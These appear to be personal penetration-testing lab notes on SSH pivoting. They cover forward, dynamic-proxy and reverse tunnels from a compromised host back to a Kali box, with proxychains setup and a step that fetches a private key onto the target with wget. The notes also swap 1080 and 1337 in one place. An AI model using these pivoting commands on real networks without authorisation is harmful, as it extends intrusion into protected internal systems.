### TRY THIS FIRST!
KALI: 
```bash - kali
ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
```

TARGET:
```bash - target
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -I key kali@$KALI
```

With the dynamic reverse tunnel established, edit the /etc/proxychains4.conf to use the port 1080.

**Forward Connections**

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

-   Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:

==Run on kali==
```bash - kali
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

-   We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.  
      
-   Proxies are made using the `-D` switch, for example: `-D 1080`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:

```bash - kali
ssh -D 127.0.0.1:1080 user@172.16.0.5 -fN
```

This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

**Reverse Connections**  

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

```bash - kali
ssh-keygen
```

Give it a name of "./reverse"

```bash - kali
./reverse
```

![[Pasted image 20220115184520.png]]

```bash - kali
ls -l reverse*
```

![[Pasted image 20220116104411.png]]

```bash - kali
touch ~/.ssh/authorized_keys
```

```bash - kali
mousepad ~/.ssh/authorized_keys
```

```bash - kali
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
```

Paste in the contents of reverse.pub:

The final entry in the `authorized_keys` file should look something like this:

![[Pasted image 20220115184759.png]]

Check that ssh is running:

```bash - kali
sudo systemctl status ssh
```

if not, start it:

```bash - kali
sudo systemctl start ssh
```

Transfer private key to target box (Vic1).

[[Python#Server]]

```bash - target
wget http://$KALI/reverse
```


| Kali | Vic1 | Vic2 | 
| --- | --- | --- |
| 172.16.0.20 | 172.16.0.5 | 172.16.0.10

```bash - Vic1
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

```bash - Vic1
ssh -R LOCAL_PORT:VICTIM2:VICTIM2_PORT kali@$KALI -i KEYFILE -fN
```

==Run the following on the Vic1 box (172.16.0.5)==

```bash - Vic1
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

_**Note:** Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems._

```bash - kali
ssh -N -R $TARGET:5555:127.0.0.1:5555 -p 2222 student@$TARGET
```
